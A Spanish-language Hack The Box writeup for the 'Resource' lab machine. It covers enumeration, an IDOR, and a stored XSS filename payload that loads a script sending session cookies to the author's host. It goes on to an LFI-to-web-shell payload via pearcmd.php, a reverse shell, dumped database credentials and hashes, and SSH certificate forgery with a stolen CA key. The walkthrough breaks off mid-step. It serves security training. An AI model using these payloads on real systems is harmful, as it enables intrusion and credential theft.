+++
author = "Andrés Del Cerro"
title = "Hack The Box: Resource Writeup | Hard"
date = "2024-11-23"
description = ""
tags = [
    "HackTheBox",
    "Resource",
    "Writeup",
    "Cybersecurity",
    "Penetration Testing",
    "CTF",
    "Reverse Shell",
    "Privilege Escalation",
    "RCE",
    "Exploit",
    "Linux",
    "HTTP Enumeration",
    "XSS",
    "Stored XSS",
    "Web Fuzzing",
    "Local File Inclusion",
    "Insecure Direct Object Reference",
    "Abusing ThinkPHP",
    "Docker Breakout",
    "Information Disclosure",
    "User Pivoting",
    "Abusing CA",
    "Creating Custom Certificate",
    "Abusing API",
    "Abusing Bash Script",
    "Abusing Sudo Privileges",
    "Abusing Bash Globbing",
    "Scripting",
    "Bash Scripting"
]

+++

# Hack The Box: Resource Writeup

Welcome to my detailed writeup of the hard difficulty machine **"Resource"** on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.

# TCP Enumeration

```console
$ rustscan -a 10.129.197.255 --ulimit 5000 -g                                     
10.129.197.255 -> [22,80,2222]
```

```console
$ nmap -p22,80,2222 -sCV 10.129.197.255 -oN allPorts                              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-10 19:18 CEST                       
Nmap scan report for 10.129.197.255                                                       
Host is up (0.036s latency).                                                              
                                                                    
PORT     STATE SERVICE VERSION                                                            
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)                      
| ssh-hostkey:                                                                                                  
|   256 78:1e:3b:85:12:64:a1:f6:df:52:41:ad:8f:52:97:c0 (ECDSA)                                                                                               
|_  256 e1:1a:b5:0e:87:a4:a1:81:69:94:9d:d4:d4:a3:8a:f9 (ED25519)                                               
80/tcp   open  http    nginx 1.18.0 (Ubuntu)                                                                    
|_http-title: Did not follow redirect to http://itrc.ssg.htb/                                                   
|_http-server-header: nginx/1.18.0 (Ubuntu)                                    
2222/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)                                                    
| ssh-hostkey:                                                                                                                          
|   256 f2:a6:83:b9:90:6b:6c:54:32:22:ec:af:17:04:bd:16 (ECDSA)                                                                         
|_  256 0c:c3:9c:10:f5:7f:d3:e4:a8:28:6a:51:ad:1a:e1:bf (ED25519)                                                                                             
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                       

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                
Nmap done: 1 IP address (1 host up) scanned in 11.50 seconds  
```

# UDP Enumeration

```console
$ sudo nmap --top-ports 1500 -n -Pn --min-rate 5000 -sU 10.129.197.255 -oN allPorts.UDP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-10 19:19 CEST
Nmap scan report for 10.129.197.255
Host is up (0.040s latency).
Not shown: 1494 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
16545/udp closed unknown
17549/udp closed unknown
20309/udp closed unknown
27027/udp closed unknown
27666/udp closed unknown
31625/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 0.82 seconds
```

Del escaneo inicial encontramos el dominio `itrc.ssg.htb`, lo añadimos al `/etc/hosts`

Una cosa interesante es que encontramos dos instancias de SSH con dos versiones de OpenSSH distintas, una indica ser `Debian` y otra indica ser `Ubuntu` por lo cual es un indicador de que existen contenedores por detrás.

Igualmente ninguna de estas instancias son vulnerables así que el punto de entrada debe de ser mediante el sitio web.

# HTTP Enumeration
`whatweb` no nos reporta nada relevante, únicamente que se está utilizando PHP y nginx por detrás.
```console
$ whatweb http://itrc.ssg.htb
http://itrc.ssg.htb [200 OK] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.197.255], PHP[8.1.29], Script, Title[IT Support Center], X-Powered-By[PHP/8.1.29], nginx[1.18.0]
```

Así se ve el sitio web.
![Write-up Image](images/Screenshot_1.png)

Podemos crearnos una cuenta de usuario y parece que es un sistema de ticketing.
![Write-up Image](images/Screenshot_2.png)

## Multiple XSS (Failed)
Podemos crear un ticket y podemos comprobar que en los comentarios del ticket no se acontece un XSS.
![Write-up Image](images/Screenshot_4.png)

Tampoco en el nombre del ticket ni en la descripción.
![Write-up Image](images/Screenshot_5.png)

Tampoco en el nombre de usuario.
![Write-up Image](images/Screenshot_6.png)

Podemos subir un archivo y el nombre del archivo son una secuencia de caracteres y números.
![Write-up Image](images/Screenshot_7.png)

Al interceptar las solicitudes con `burpsuite` encontramos un endpoint `/api/`
![Write-up Image](images/Screenshot_8.png)

## Fuzzing
Con `feroxbuster` podemos fuzzear a ver si encontramos algún recurso bajo `/api`
```console
$ feroxbuster -u http://itrc.ssg.htb/api/ -w /opt/SecLists/Discovery/Web-Content/d
irectory-list-2.3-medium.txt -d 1 -t 100 -x php
```

Y vemos un `admin.php`, pero devuelve un error 500.
![Write-up Image](images/Screenshot_9.png)

![Write-up Image](images/Screenshot_10.png)

También vemos un `login.php` y un `register.php` y recordemos que la URL para iniciar sesión es `http://itrc.ssg.htb/?page=login` por lo cual quizás internamente esté apuntando a este recurso.

Podemos acceder al "panel administrativo" utilizando el parámetro `page` 
![Write-up Image](images/Screenshot_11.png)


Podemos utilizar la función de "ping" y vemos que nos llega un ping de la máquina víctima.
![Write-up Image](images/Screenshot_12.png)

```console
$ sudo tcpdump icmp -i tun0
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
19:46:18.895801 IP ssg.htb > 10.10.14.143: ICMP echo request, id 1, seq 1, length 64
19:46:18.895846 IP 10.10.14.143 > ssg.htb: ICMP echo reply, id 1, seq 1, length 64
```

No podemos acceder a tickets de otras personas.

Detectamos un usuario llamado `zzinter`
![Write-up Image](images/Screenshot_13.png)

# IDOR
Podemos crear un comentario en un post de otras personas, si interceptamos la petición al crear un comentario vemos que hace una solicitud POST a `/api/create_comment.php` donde hay un campo `id`, podemos modificarlo y la petición será satisfactoria.

Para comprobar esto, he creado un ticket como el usuario `test`
![Write-up Image](images/Screenshot_14.png)

Ahora podemos cambiar el ID.
![Write-up Image](images/Screenshot_15.png)

Y vemos que efectivamente, podemos inyectar comentarios en los tickets de los demás.
![Write-up Image](images/Screenshot_16.png)

También podemos insertar archivos en los tickets de los demás. ![Write-up Image](images/Screenshot_17.png)

Como el nombre del archivo sale en pantalla, podemos intentar realizar un XSS aquí.

Después de probar algunos payloads y a base de prueba y error, este funcionó.
![Write-up Image](images/Screenshot_18.png)

![Write-up Image](images/Screenshot_19.png)

Detecté que se filtra el carácter `/`, por lo cual podemos hacer un payload para cargar un script que controlemos nosotros utilizando `eval` y `atob`.

El payload es el siguiente.
```console
filename=<svg onload=eval(atob('dmFyIHNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwpzY3JpcHQuc3JjID0gJ2h0dHA6Ly8xMC4xMC4xNC4xNDM6ODA4Mi9lLmpzJzsKZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZChzY3JpcHQpOwo=')) >.zip
```

Que en esencia es este snippet de código javascript que crea un elemento script, añade el `src` para que sea nuestro servidor y lo añade al DOM.
```javascript
var script = document.createElement('script');
script.src = 'http://10.10.14.143:8082/e.js';
document.head.appendChild(script);
```

![Write-up Image](images/Screenshot_20.png)

Si recargamos la página vemos que nos llega la solicitud.
```console
$ python3 -m http.server 8082
Serving HTTP on 0.0.0.0 port 8082 (http://0.0.0.0:8082/) ...
10.10.14.143 - - [10/Sep/2024 20:28:39] code 404, message File not found
10.10.14.143 - - [10/Sep/2024 20:28:39] "GET /e.js HTTP/1.1" 404 -
```

Ahora creamos un archivo `e.js` que nos envíe la cookie del usuario.
```javascript
fetch("http://10.10.14.143:8082/?cookies="+btoa(document.cookie))
```

Y si ahora recargamos la página.
```console
$ python3 -m http.server 8082
Serving HTTP on 0.0.0.0 port 8082 (http://0.0.0.0:8082/) ...
10.10.14.143 - - [10/Sep/2024 20:29:31] "GET /e.js HTTP/1.1" 200 -
10.10.14.143 - - [10/Sep/2024 20:29:32] "GET /?cookies=UEhQU0VTU0lEPWQ3Yzk3Yzg3MmEwNDQ0NjhiNDA1ZjZiN2I0MGExMmMy HTTP/1.1" 200 -
```

Y ya tenemos la cookie de mi usuario.
```console
$ echo "UEhQU0VTU0lEPWQ3Yzk3Yzg3MmEwNDQ0NjhiNDA1ZjZiN2I0MGExMmMy" | base64 -d
PHPSESSID=d7c97c872a044468b405f6b7b40a12c2
```

Ahora vamos a intentar quitar la cookie a algún otro usuario de los tickets encontrados en el panel de administración.

Cuando intentamos asignar el comentario a un ID que no existe vemos un error SQL.
![Write-up Image](images/Screenshot_21.png)

Después de un rato esperando, no conseguí robar las cookies de sesión por lo que quiero pensar que no hay nadie revisando los tickets.

## LFI + `pearcmd.php` + URL args -> Foothold
Después de un rato encontré [este apartado en HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion#via-pearcmd.php--url-args)
![Write-up Image](images/Screenshot_22.png)

Podemos probar a hacer una petición con los parámetros para intentar crear un archivo con contenido PHP a través de un lolbin en PHP llamado `pearcmd.php`. Como dato, esta configuración está habilitada por defecto en PHP de contenedores Docker, por lo cual si se tiene un LFI probablemente se pueda explotar esto.
![Write-up Image](images/Screenshot_23.png)

Y efectivamente, se ha creado el archivo en `/tmp/hello.php`, no hay que incluir el .php al final ya que por detrás a nivel de código se incluye.
![Write-up Image](images/Screenshot_24.png)

Utilizando este payload `/index.php?+config-create+/&page=/usr/local/lib/php/pearcmd&/<?=shell_exec($_GET["cmd"])?>+/tmp/s.php` conseguimos ejecución remota de comandos.

![Write-up Image](images/Screenshot_26.png)

![Write-up Image](images/Screenshot_25.png)

Nos ponemos en escucha con `pwncat-cs` por el puerto 443 y nos enviamos la reverse shell con el típico one-liner.
![Write-up Image](images/Screenshot_27.png)

```console
$ sudo pwncat-cs -lp 443
[22:21:06] Welcome to pwncat 🐈!          
[22:21:37] received connection from 10.129.197.255:45402                        bind.py:84
[22:21:39] 10.129.197.255:45402: registered new host w/ db                  manager.py:957
(local) pwncat$                                                                           
(remote) www-data@itrc:/var/www/itrc$ whoami
www-data
```

Comprobamos que estamos en un contenedor.
```console
(remote) www-data@itrc:/var/www/itrc$ hostname -I
172.223.0.3
```

## Docker Breakout
Encontramos credenciales para la base de datos.
```console
(remote) www-data@itrc:/var/www/itrc$ cat db.php 
<?php

$dsn = "mysql:host=db;dbname=resourcecenter;";
$dbusername = "jj";
$dbpassword = "ugEG5rR5SG8uPd";
$pdo = new PDO($dsn, $dbusername, $dbpassword);

try {
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Connection failed: " . $e->getMessage());
```

Podemos acceder a la base de datos.
```console
(remote) www-data@itrc:/var/www/itrc$ mysql -ujj -pugEG5rR5SG8uPd -h db
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 510
Server version: 11.4.3-MariaDB-ubu2404 mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```

Examinando la base de datos, vemos que hay una llamada `resourcecenter`, dentro existen 3 tablas.

```console
+--------------------------+
| Tables_in_resourcecenter |
+--------------------------+
| messages                 |
| tickets                  |
| users                    |
+--------------------------+
```

También podemos ver los usuarios.
```console
+----+---------------------------+--------------------------------------------------------------+-------+------------+
| id | user                      | password                                                     | role  | department |
+----+---------------------------+--------------------------------------------------------------+-------+------------+
|  1 | zzinter                   | $2y$10$VCpu.vx5K6tK3mZGeir7j.ly..il/YwPQcR2nUs4/jKyUQhGAriL2 | admin | NULL       |
|  2 | msainristil               | $2y$10$AT2wCUIXC9jyuO.sNMil2.R950wZlVQ.xayHZiweHcIcs9mcblpb6 | admin | NULL       |
|  3 | mgraham                   | $2y$10$4nlQoZW60mVIQ1xauCe5YO0zZ0uaJisHGJMPNdQNjKOhcQ8LsjLZ2 | user  | NULL       |
|  4 | kgrant                    | $2y$10$pLPQbIzcehXO5Yxh0bjhlOZtJ18OX4/O4mjYP56U6WnI6FvxvtwIm | user  | NULL       |
|  5 | bmcgregor                 | $2y$10$nOBYuDGCgzWXIeF92v5qFOCvlEXdI19JjUZNl/zWHHX.RQGTS03Aq | user  | NULL       |
|  9 | pointed                   | $2y$10$LjZWC7mewCk6t0CpT/r/auSQmSLdrtscI8fAezkabgZE4w0mElGrG | user  | NULL       |
| 10 | <script>alert(1)</script> | $2y$10$1Un9daXoQqLxqKjvwO9My.mHHIkiaOXs.vH4SzZqKB6.UAKjFaQlC | user  | NULL       |
| 11 | test                      | $2y$10$Regdwcv68bsQS73fqZFn/uvq1Utk47Usiq2.sgxIMvfaKGnnmspFW | user  | NULL       |
| 12 | test2                     | $2y$10$dLq2ESFeG/vl3bX9eEq0ludIFL45.D0PeACyRyYDIM.Eo1zlEiU/W | user  | NULL       |
+----+---------------------------+--------------------------------------------------------------+-------+------------+
```

No pude crackear ningún hash pero ahora tenemos una bonita lista de usuarios.
```console
$ cat users.txt 
bmcgregor
kgrant
mgraham
msainristil
zzinter
```

Encontramos un archivo adjunto, vamos a analizarlo.
![Write-up Image](images/Screenshot_28.png)

Detecté tres archivos comprimidos interesantes. Me descargo los 3 usando la función `download` interna de `pwncat-cs` para analizarlos en mi equipo.
```console
(local) pwncat$ download eb65074fe37671509f24d1652a44944be61e4360.zip
eb65074fe37671509f24d1652a44944be61e4360.zip ━━━━━━━━━━━ 100.0% • 275/275    • ? • 0:00:00
                                                                  bytes                   [22:31:38] downloaded 275.00B in 0.41 seconds                               download.py:71
(local) pwncat$ download e8c6575573384aeeab4d093cc99c7e5927614185.zip
e8c6575573384aeeab4d093cc99c7e5927614185.zip ━━━━━━━━━━━ 100.0% • 634/634    • ? • 0:00:00
                                                                  bytes                   [22:31:46] downloaded 634.00B in 0.27 seconds                               download.py:71
(local) pwncat$ download c2f4813259cc57fab36b311c5058cf031cb6eb51.zip
c2f4813259cc57fab36b311c5058cf031cb6eb51.zip ━━━━━━━ 100.0% • 1.2/1.2 • 55.5     • 0:00:00
                                                              MB        MB/s              
[22:31:51] downloaded 1.16MiB in 0.49 seconds      
```

Uno de los archivos contiene un archivo .har
```console
$ unzip c2f4813259cc57fab36b311c5058cf031cb6eb51.zip                              
Archive:  c2f4813259cc57fab36b311c5058cf031cb6eb51.zip                                    
  inflating: itrc.ssg.htb.har 
```

Otro tiene una clave pública del usuario `mgraham`
```console
$ unzip e8c6575573384aeeab4d093cc99c7e5927614185.zip 
Archive:  e8c6575573384aeeab4d093cc99c7e5927614185.zip
  inflating: id_rsa.pub 
```

Y el otro .zip contiene otra clave pública pero esta vez de `bmcgregor`
```console
$ unzip eb65074fe37671509f24d1652a44944be61e4360.zip 
Archive:  eb65074fe37671509f24d1652a44944be61e4360.zip
  inflating: id_ed25519.pub
```

Como no puedo hacer nada con las claves públicas, vamos a analizar el archivo .har

> Es un formato de archivo que utilizan varias herramientas de sesión HTTP para exportar los datos capturados. Básicamente, se trata de un objeto JSON con un conjunto específico de campos.

El problema es que es un archivo de 4000 lineas.
```console
$ cat itrc.ssg.htb.har | wc -l
4426
```

Filtrando por `pass` encontramos una credencial.
```console
$ cat itrc.ssg.htb.har | grep pass | less
```
![Write-up Image](images/Screenshot_29.png)

Con esta credencial podemos acceder a través de SSH a la máquina víctima.
```console
$ sshpass -p '82yards2closeit' ssh msainristil@10.129.197.255
Linux itrc 5.15.0-117-generic #127-Ubuntu SMP Fri Jul 5 20:13:28 UTC 2024 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
msainristil@itrc:~$ id
uid=1000(msainristil) gid=1000(msainristil) groups=1000(msainristil)
```

## User Pivoting
Estamos en otro contenedor.
```console
msainristil@itrc:/home$ hostname -I
172.223.0.3
```

Vemos el usuario `zzinter`
```console
msainristil@itrc:/home$ ls -la
total 20
drwxr-xr-x 1 root        root        4096 Aug 13 11:13 .
drwxr-xr-x 1 root        root        4096 Aug 13 11:13 ..
drwx------ 1 msainristil msainristil 4096 Aug 13 11:13 msainristil
drwx------ 1 zzinter     zzinter     4096 Sep 10 15:16 zzinter
```

Y esto es interesante, nos encontramos una clave privada pero de la CA.
```console
msainristil@itrc:~/decommission_old_ca$ ls -la
total 20
drwxr-xr-x 1 msainristil msainristil 4096 Jan 24  2024 .
drwx------ 1 msainristil msainristil 4096 Aug 13 11:13 ..
-rw------- 1 msainristil msainristil 2602 Jan 24  2024 ca-itrc
-rw-r--r-- 1 msainristil msainristil  572 Jan 24  2024 ca-itrc.pub
```

Tener la clave privada de la CA es muy peligroso ya que podemos si se permite el acceso por SSH que hemos visto antes que sí mediante algunos mensajes de la base de datos, firmar un certificado con la clave de la CA como cualquier usuario y poder iniciar sesión como este.

Entonces podemos generarnos un par de claves y firmarlos con la clave privada de la entidad certificadora, que es la que tenemos.
```console
$ ssh-keygen -t rsa -f pointed
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in pointed
Your public key has been saved in pointed.pub
The key fingerprint is:
SHA256:blvDbjxySkHARnbWjYq0m/wTl7qABo/8ZCMu4B+JiO0 pointedsec@parrot
The key's randomart image is:
+---[RSA 3072]----+
|     o+ o. o     |
|     .++  o .    |
|     o o..       |
|      o..        |
|  .  . oS  .     |
|+o.+..+..oo      |
|=.=oB ..+=+      |
|.+ *.. +=+=.     |
| .E..   +B..     |
+----[SHA256]-----+
```

```console
$  ls
pointed  pointed.pub
```

Nos vamos a copiar la clave privada de la CA.
```console
$ scp msainristil@10.129.197.255:/home/msainristil/decommission_old_ca/ca-itrc .
msainristil@10.129.197.255's password: 
ca-itrc                                                 100% 2602    33.7KB/s   00:00    
```

Le establecemos los permisos adecuados.
```console
$ chmod 600 ca-itrc
```

Ahora firmamos nuestra clave pública con la clave de la CA para el usuario `zzinter`
```console
 ssh-keygen -s ca-itrc -n zzinter -I zzinter-key pointed.pub 
Signed user key pointed-cert.pub: id "zzinter-key" serial 0 for zzinter valid forever
```

Ahora esto nos genera una clave firmada con la clave de la CA, en mi caso con nombre `pointed-cert.pub`

Podemos analizar la clave y vemos que en `Principals` está el usuario que vamos a impersonar.
```console
$ ssh-keygen -Lf pointed-cert.pub 
pointed-cert.pub:
        Type: ssh-rsa-cert-v01@openssh.com user certificate
        Public key: RSA-CERT SHA256:blvDbjxySkHARnbWjYq0m/wTl7qABo/8ZCMu4B+JiO0
        Signing CA: RSA SHA256:BFu3V/qG+Kyg33kg3b4R/hbArfZiJZRmddDeF2fUmgs (using rsa-sha2-512)
        Key ID: "zzinter-key"
        Serial: 0
        Valid: forever
        Principals: 
                zzinter
        Critical Options: (none)
        Extensions: 
                permit-X11-forwarding
                permit-agent-forwarding
                permit-port-forwarding
                permit-pty
                permit-user-rc

```

Y ahora podemos iniciar sesión como este usuario.
```console
$ ssh -o CertificateFile=pointed-cert.pub -i pointed zzinter@ssg.htb
Enter passphrase for key 'pointed': 
Linux itrc 5.15.0-117-generic #127-Ubuntu SMP Fri Jul 5 20:13:28 UTC 2024 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Sep 10 19:15:03 2024 from 10.10.14.143
zzinter@itrc:~$ id
uid=1001(zzinter) gid=1001(zzinter) groups=1001(zzinter)
```

Pero bien, esto significa que la CA confía de cualquier clave pública firmada con su certificado, por lo cual podemos firmar mi clave pública para iniciar sesión como `root` en este contenedor.

Simplemente eliminamos la clave firmada anterior `pointed-cert.pub`

Ahora la firmamos otra vez pero para el usuario `root`
```console
$ ssh-keygen -s ca-itrc -n root -I root-key pointed.pub 
Signed user key pointed-cert.pub: id "root-key" serial 0 for root valid forever
```

Y conseguimos escalar privilegios en este contenedor.
```console
$ ssh -o CertificateFile=pointed-cert.pub -i pointed root@ssg.htb
Enter passphrase for key 'pointed': 
Linux itrc 5.15.0-117-generic #127-Ubuntu SMP Fri Jul 5 20:13:28 UTC 2024 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Sep 10 19:15:32 2024 from 10.10.14.143
root@itrc:~# id
uid=0(root) gid=0(root) groups=0(root)
```

En el directorio personal de `zzinter` podemos visualizar la flag del usuario.
```console
root@itrc:/home/zzinter# cat user.txt 
77b42234c05a219...
```

# Docker Breakout 2
En este directorio encontramos un script llamado `sign_key_api.sh`
```bash
#!/bin/bash

usage () {
    echo "Usage: $0 <public_key_file> <username> <principal>"
    exit 1
}

if [ "$#" -ne 3 ]; then
    usage
fi

public_key_file="$1"
username="$2"
principal_str="$3"

supported_principals="webserver,analytics,support,security"
IFS=',' read -ra principal <<< "$principal_str"
for word in "${principal[@]}"; do
    if ! echo "$supported_principals" | grep -qw "$word"; then
        echo "Error: '$word' is not a supported principal."
        echo "Choose from:"
        echo "    webserver - external web servers - webadmin user"
        echo "    analytics - analytics team databases - analytics user"
        echo "    support - IT support server - support user"
        echo "    security - SOC servers - support user"
        echo
        usage
    fi
done

if [ ! -f "$public_key_file" ]; then
    echo "Error: Public key file '$public_key_file' not found."
    usage
fi

public_key=$(cat $public_key_file)

curl -s signserv.ssg.htb/v1/sign -d '{"pubkey": "'"$public_key"'", "username": "'"$username"'", "principals": "'"$principal"'"}' -H "Content-Type: application/json" -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"
```

Aprovechando este script, podemos firmar otra clave pero esta vez en la máquina víctima real para conseguir acceso como los usuarios `webadmin`, `analytics` y `support`

Podemos firmar nuestra clave privada pero ahora con otra clave de CA distinta, el problema es que esto al realizarse a través de la API, no podemos generar un certificado para `root` por ejemplo.

Generamos un certificado para el usuario `support`
```console
root@itrc:/home/zzinter# ./sign_key_api.sh pointed.pub zzinter support                    
ssh-rsa-cert-v01@openssh.com AAAAHHNzaC1yc2EtY2VydC12MDFAb3BlbnNzaC5jb20AAAAg1nNPtPgZyUngd
sLPDGFpEYwbjc/Khxwwr1tw/XWErQkAAAADAQABAAABgQChF6mmqr3WE3aHoYIt3mpXAAo7w2qHWyRhcf0zHRUIwup
qy3gRmZg0TeO3xr5YDkr2WPuCjHMmqb3iMl9hteC+mYyEUrrs9tgMYUIqWB/Qn9TIM3JKo3XUUojcxMw8PgKiIIsTb
b7r0ysZ//D+yN/nWprlLGlsaRHVrvka8CWv08bT14NjFoyAXT2DKG+8DmoSqt6qDjQI/QpXm1LDadTqDKcBaTOcdHi
tyt17u+T01LDEUM8fsIjTJ81U3oECXnGwVhXPFVokxpZsRL/qkp9mx6uvG+W2h5CI309kxCUSZVcDnRBg9iOSPjb9P
xU74O7UtighO1RHCyxYsB5OvKAw0ExOOW4W89yMKEWfPDKEFbkI9nJO1NNgAyDR5olERSkS8T+pKwJeylHgWAs09Kg
juPHW+DJkJHATWqjHPDzQLfrBC1KoZ0CSZOSzqEJ433epdKaFsBgqrqNMXhaYBBaXlez75vDLcmQvfV+7mx6Ae8zHl
hQLnwEltm9/IZMcgUcAAAAAAAAAKwAAAAEAAAAHenppbnRlcgAAAAsAAAAHc3VwcG9ydAAAAABm12Re//////////8
AAAAAAAAAggAAABVwZXJtaXQtWDExLWZvcndhcmRpbmcAAAAAAAAAF3Blcm1pdC1hZ2VudC1mb3J3YXJkaW5nAAAAA
AAAABZwZXJtaXQtcG9ydC1mb3J3YXJkaW5nAAAAAAAAAApwZXJtaXQtcHR5AAAAAAAAAA5wZXJtaXQtdXNlci1yYwA
AAAAAAAAAAAAAMwAAAAtzc2gtZWQyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQAAAFMAA
AALc3NoLWVkMjU1MTkAAABAH6BAtkWeLLTRybgKp9QdZv3ZeJAKQsKn+XtcIZmvhyYxeUE0w0NTyExY1IHrz+S6e92
jDoSmWAnaqx1J1scrBA== pointedsec@parrot
```

Lo metemos en un archivo `test`
```console
$ cat test 
ssh-rsa-cert-v01@openssh.com AAAAHHNzaC1yc2EtY2VydC12MDFAb3BlbnNzaC5jb20AAAAgLrPuwGYaITA/DUuLKmz14vzZh9i/icjYGpqh9WgoFDkAAAADAQABAAABgQChF6mmqr3WE3aHoYIt3mpXAAo7w2qHWyRhcf0zHRUIwupqy3gRmZg0TeO3xr5YDkr2WPuCjHMmqb3iMl9hteC+mYyEUrrs9tgMYUIqWB/Qn9TIM3JKo3XUUojcxMw8PgKiIIsTbb7r0ysZ//D+yN/nWprlLGlsaRHVrvka8CWv08bT14NjFoyAXT2DKG+8DmoSqt6qDjQI/QpXm1LDadTqDKcBaTOcdHityt17u+T01LDEUM8fsIjTJ81U3oECXnGwVhXPFVokxpZsRL/qkp9mx6uvG+W2h5CI309kxCUSZVcDnRBg9iOSPjb9PxU74O7UtighO1RHCyxYsB5OvKAw0ExOOW4W89yMKEWfPDKEFbkI9nJO1NNgAyDR5olERSkS8T+pKwJeylHgWAs09KgjuPHW+DJkJHATWqjHPDzQLfrBC1KoZ0CSZOSzqEJ433epdKaFsBgqrqNMXhaYBBaXlez75vDLcmQvfV+7mx6Ae8zHlhQLnwEltm9/IZMcgUcAAAAAAAAAKAAAAAEAAAAHc3VwcG9ydAAAAAsAAAAHc3VwcG9ydAAAAABm12No//////////8AAAAAAAAAggAAABVwZXJtaXQtWDExLWZvcndhcmRpbmcAAAAAAAAAF3Blcm1pdC1hZ2VudC1mb3J3YXJkaW5nAAAAAAAAABZwZXJtaXQtcG9ydC1mb3J3YXJkaW5nAAAAAAAAAApwZXJtaXQtcHR5AAAAAAAAAA5wZXJtaXQtdXNlci1yYwAAAAAAAAAAAAAAMwAAAAtzc2gtZWQyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQAAAFMAAAALc3NoLWVkMjU1MTkAAABAgnHOGp89bHoBJs85JAdd+vyvHZNnKo517vnkD0YcSzLUXsHaHo/bDj4fLW0XBYY2VAXqWsSCVJsxeLWbq836DQ== pointedsec@parrot
```

Y ganamos acceso a la máquina víctima como `support`
```console
$ ssh -o CertificateFile=test -i pointed support@ssg.htb -p 2222
Enter passphrase for key 'pointed': 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-117-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue Sep 10 07:34:41 PM UTC 2024

  System load:           0.0
  Usage of /:            79.0% of 10.73GB
  Memory usage:          14%
  Swap usage:            0%
  Processes:             246
  Users logged in:       0
  IPv4 address for eth0: 10.129.197.255
  IPv6 address for eth0: dead:beef::250:56ff:fe94:c869


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Sep 10 19:33:15 2024 from 10.10.14.143
support@ssg:~$ id
uid=1000(support) gid=1000(support) groups=1000(support)
```

Ahora si que estamos en la máquina víctima.
```console
support@ssg:~$ hostname -I
10.129.197.255 172.17.0.1 172.21.0.1 172.223.0.1 dead:beef::250:56ff:fe94:c869 
```

Un poco excesivo para una máquina de dificultad media.

# User Pivoting
Pasando el `linpeas` encontramos lo siguiente.
```console
╔══════════╣ Unexpected in /opt (usually empty)                                                                                                               
total 16                                                                                                                                                      
drwxr-xr-x  3 root root    4096 Aug 13 13:19 .                                                                                                                
drwxr-xr-x 19 root root    4096 Jul 24 11:54 ..                                                                                                               
-rwxr-----  1 root zzinter 1378 Aug 13 13:19 sign_key.sh                                                                                                      
drwx------  4 root root    4096 Feb  8  2024 signserv                                                                                                         
                                                                      
```

Parece que ahí se encuentra la API para los certificados del puerto 8000 interno pero no podemos revisar el código fuente.

Otra cosa que podemos intentar es comprobar si realmente la API nos prohíbe firmar las claves hacia otros principals y ver si no es una limitación del script.

En la máquina víctima, ahora que hemos ganado acceso podemos comprobar los principals y vemos dos.
```console
support@ssg:/etc/ssh/auth_principals$ cat root 
root_user
support@ssg:/etc/ssh/auth_principals$ cat zzinter 
zzinter_temp
```

Ahora podemos copiarnos el script que hemos encontrado anteriormente, el `sign_key_api.sh` a nuestra máquina.

Agregamos el subdominio `signserv.ssg.htb` al `/etc/hosts`

Y la última línea del script vamos a modificarla a esto.
```console
curl -s signserv.ssg.htb/v1/sign -d '{"pubkey": "'"$public_key"'", "username": "'"$username"'", "principals": "zzinter_temp"}' -H "Content-Type: application/json" -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"
```

Es decir, vamos a cambiar el campo `principals` y vamos a establecer el de `zzinter` que habíamos visto anteriormente.
![Write-up Image](images/Screenshot_30.png)

Ahora intentamos firmar nuestra clave pública.
```console
$ ./sign.sh pointed.pub zzinter support
